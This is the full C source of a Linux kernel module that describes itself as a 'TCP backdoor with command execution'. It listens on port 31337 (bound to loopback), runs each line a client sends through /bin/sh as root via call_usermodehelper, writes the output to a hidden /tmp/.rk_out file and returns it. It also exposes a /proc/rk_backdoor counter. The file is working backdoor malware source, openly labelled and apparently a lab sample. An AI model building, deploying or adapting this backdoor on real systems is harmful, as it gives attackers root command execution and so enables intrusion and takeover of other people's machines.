// SPDX-License-Identifier: GPL-2.0
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/in.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/slab.h>
#include <linux/umh.h>
#include <net/sock.h>

#define BACKDOOR_PORT 31337

static struct proc_dir_entry *proc_entry;
static struct task_struct *listener;
static struct socket *listen_sock;
static atomic_t cmd_count = ATOMIC_INIT(0);
static bool stopping;

static int send_all(struct socket *sock, const char *buf, int len)
{
	struct kvec vec = { .iov_base = (void *)buf, .iov_len = len };
	struct msghdr msg = { 0 };

	return kernel_sendmsg(sock, &msg, &vec, 1, len);
}

static int recv_line(struct socket *sock, char *buf, int maxlen)
{
	struct kvec vec;
	struct msghdr msg = { 0 };
	int total = 0, ret;

	while (total < maxlen - 1) {
		vec.iov_base = buf + total;
		vec.iov_len = 1;
		ret = kernel_recvmsg(sock, &msg, &vec, 1, 1, 0);
		if (ret <= 0)
			return ret;
		if (buf[total] == '\n') {
			buf[total] = '\0';
			return total;
		}
		total++;
	}
	buf[total] = '\0';
	return total;
}

static int exec_cmd(const char *cmd, char *out, int outlen)
{
	char cmdline[320];
	char *argv[] = { "/bin/sh", "-c", cmdline, NULL };
	char *envp[] = { "PATH=/bin:/sbin:/usr/bin", NULL };
	struct file *f;
	loff_t pos = 0;
	int ret;

	snprintf(cmdline, sizeof(cmdline), "%s > /tmp/.rk_out 2>&1", cmd);
	ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

	f = filp_open("/tmp/.rk_out", O_RDONLY, 0);
	if (IS_ERR(f)) {
		snprintf(out, outlen, "(exec error %d)\n", ret);
		return strlen(out);
	}
	ret = kernel_read(f, out, outlen - 1, &pos);
	filp_close(f, NULL);
	if (ret < 0)
		ret = 0;
	out[ret] = '\0';
	return ret;
}

static void handle_client(struct socket *client)
{
	char cmd[256];
	char *output;
	int len, outlen;

	output = kmalloc(4096, GFP_KERNEL);
	if (!output)
		return;

	send_all(client, "hello-backdoor> ", 16);

	while (!kthread_should_stop() && !stopping) {
		len = recv_line(client, cmd, sizeof(cmd));
		if (len <= 0)
			break;
		if (strcmp(cmd, "exit") == 0)
			break;

		atomic_inc(&cmd_count);
		outlen = exec_cmd(cmd, output, 4096);
		if (outlen > 0)
			send_all(client, output, outlen);
		send_all(client, "hello-backdoor> ", 16);
	}

	kfree(output);
}

static int listener_fn(void *data)
{
	struct socket *client;
	int err;

	while (!kthread_should_stop() && !stopping) {
		err = kernel_accept(listen_sock, &client, O_NONBLOCK);
		if (err == -EAGAIN) {
			schedule_timeout_interruptible(HZ / 4);
			continue;
		}
		if (err < 0)
			break;

		handle_client(client);
		sock_release(client);
	}
	return 0;
}

static ssize_t proc_read(struct file *f, char __user *buf,
			  size_t count, loff_t *pos)
{
	char tmp[64];
	int len;

	len = snprintf(tmp, sizeof(tmp), "port=%d\ncommands=%d\n",
		       BACKDOOR_PORT, atomic_read(&cmd_count));
	return simple_read_from_buffer(buf, count, pos, tmp, len);
}

static const struct proc_ops bd_proc_ops = {
	.proc_read = proc_read,
};

static int open_listener(void)
{
	struct sockaddr_in addr;
	int err;

	err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &listen_sock);
	if (err)
		return err;

	sock_set_reuseaddr(listen_sock->sk);

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(BACKDOOR_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	err = kernel_bind(listen_sock, (struct sockaddr_unsized *)&addr,
			  sizeof(addr));
	if (err)
		goto fail;

	err = kernel_listen(listen_sock, 1);
	if (err)
		goto fail;

	return 0;
fail:
	sock_release(listen_sock);
	listen_sock = NULL;
	return err;
}

static int __init backdoor_init(void)
{
	int err;

	err = open_listener();
	if (err)
		return err;

	proc_entry = proc_create("rk_backdoor", 0444, NULL, &bd_proc_ops);
	if (!proc_entry) {
		sock_release(listen_sock);
		return -ENOMEM;
	}

	listener = kthread_run(listener_fn, NULL, "rk_backdoor");
	if (IS_ERR(listener)) {
		proc_remove(proc_entry);
		sock_release(listen_sock);
		return PTR_ERR(listener);
	}

	pr_info("rk: TCP backdoor listening on port %d\n", BACKDOOR_PORT);
	return 0;
}

static void __exit backdoor_exit(void)
{
	stopping = true;
	kernel_sock_shutdown(listen_sock, SHUT_RDWR);
	kthread_stop(listener);
	proc_remove(proc_entry);
	sock_release(listen_sock);
	pr_info("rk: TCP backdoor stopped\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("TCP backdoor with command execution");
